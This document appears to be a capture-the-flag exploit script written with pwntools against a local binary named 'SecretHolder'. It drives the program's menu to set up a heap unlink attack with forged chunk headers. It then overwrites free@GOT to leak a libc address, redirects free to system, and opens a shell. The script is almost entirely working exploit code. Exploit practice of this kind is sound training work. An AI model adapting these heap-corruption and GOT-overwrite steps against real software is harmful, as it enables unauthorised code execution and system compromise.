# -*- coding: utf-8 -*-
from pwn import *

context.log_level='debug'

s=process('./SecretHolder')
e=ELF('./SecretHolder')
l=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Keep_secret(level,secret):
        if level=="Small":
                level='1'
        elif level=="Big":
                level="2"
        elif level=="Huge":
                level="3"

        print s.recvuntil('3. Renew secret')
        s.sendline('1') #Keep seceret
        print s.recvuntil('3. Huge secret')
        s.send(level)
        print s.recv(1024)
        s.send(secret)

def Wipe_secret(level):
        if level=="Small":
                level='1'
        elif level=="Big":
                level="2"
        elif level=="Huge":
                level="3"

        print s.recvuntil('3. Renew secret')
        s.sendline('2') #Wipe seceret
        print s.recvuntil('3. Huge secret')
        s.sendline(level)

def Renew_secret(level,secret):
        if level=="Small":
                level='1'
        elif level=="Big":
                level="2"
        elif level=="Huge":
                level="3"

        print s.recvuntil('3. Renew secret')
        s.sendline('3') #Renew seceret
        print s.recvuntil('3. Huge secret')
        s.sendline(level)
        print s.recv(1024)
        s.send(secret)

def get_bp_str(bp_list):
        bp_list_str = ''
        for bp in bp_list:
                bp_list_str += 'b* ' + hex(bp) + '\n'
        return bp_list_str

if __name__=="__main__":

        #bp_list = [0x400add,0x400c4c]
        #bp_str = get_bp_str(bp_list)
        #print bp_str

        #gdb.attach(s,'''
        #%s
        #c
        #''' % (bp_str))

        huge_chunk=0x6020a8

        Keep_secret("Small","A"*4)
        Keep_secret("Big","B"*4)
        Keep_secret("Huge",'C'*4)

        Wipe_secret('Small')
        Wipe_secret('Big')
        Wipe_secret('Huge')

        Keep_secret('Huge','a'*30)
        Wipe_secret('Small') #house of force
        Keep_secret('Small','b'*30)
        Keep_secret('Big','c'*30)

        '''
        FD = P -> fd: FD : 0x6020a8-24(0x602090)
        BK = P -> bk: BK : 0x6020a8-16(0x602098)
        FD -> bk = BK : 0x602090+24=0x602098
        BK -> fd = FD : 0x602098+16=0x602090
        '''

        payload=''
        #Fake chunk Header
        payload+=p64(0x0)
        payload+=p64(0x21)
        payload+=p64(huge_chunk-24) #fake fd
        payload+=p64(huge_chunk-16) #fake bk

        #Fake chunk Header, This chunk will be free()
        payload+=p64(0x20) #prev chunk size
        payload+=p64(0x90) #chunk size #Prev_INUSE =0
        payload+='A'*0x80 #data

        #Next Fake chunk Header
        payload+=p64(0x90) #prev chunk size
        payload+=p64(0x91) #chunk size #Prev_INSUSE=1
        payload+='B'*0x80 #data

        #2-Next Fake chunk Header
        payload+=p64(0x90)
        payload+=p64(0x91)

        Renew_secret('Huge',payload) #Write Fake Chunk
        Wipe_secret('Big')

        payload2=''
        payload2+="\x00"*24 #Now Huge_pointer 0x602090, I will overwrite a 0x6020a8
        payload2+=p64(e.got['free']) #Addr 0x602090 in 0x6020a8 Change free_got addr

        Renew_secret('Huge',payload2)

        #Now, We have to change Free@got addr to Puts@got addr
        #then Free('Huge(in 0x6020a8)') -> Puts(*Free@got) -> Leak free_libc addr

        payload3=''
        payload3+=p64(e.plt['puts'])
        Renew_secret('Huge',payload3)

        payload4=''
        payload4+="/bin/sh;"
        payload4+="A"*8
        Renew_secret('Small',payload4)

        Wipe_secret('Small') #Puts('/bin/sh;'+'AAAAAAAA'+'libc Addr')

        '''
        00000000  2f 62 69 6e  2f 73 68 3b  41 41 41 41  41 41 41 41  │/bin│/sh;│AAAA│AAAA│
        00000010  78 fb 12 9c  e2 7f 0a 31  2e 20 4b 65  65 70 20 73  │x···│···1│. Ke│ep s│
        00000020  65 63 72 65  74 0a 32 2e  20 57 69 70  65 20 73 65  │ecre│t·2.│ Wip│e se│
        00000030  63 72 65 74  0a 33 2e 20  52 65 6e 65  77 20 73 65  │cret│·3. │Rene│w se│
        00000040  63 72 65 74  0a
        '''

        s.recvuntil('A'*8)
        libc_leak= u64(s.recv(8))
        libc_leak=libc_leak-0x310a000000000000
        libc_base=libc_leak-0x3c3b78+0xa5f0
        system_libc=libc_base+0x0003ADA0

        print "payload5"
        payload5=''
        payload5+=p64(system_libc) #free() changed puts_plt to system_addr
        Renew_secret('Huge',payload5)

        Wipe_secret('Small') #system("/bin/sh;AAAAA....")

        print "system addr: "+str(hex(system_libc))

        s.interactive()

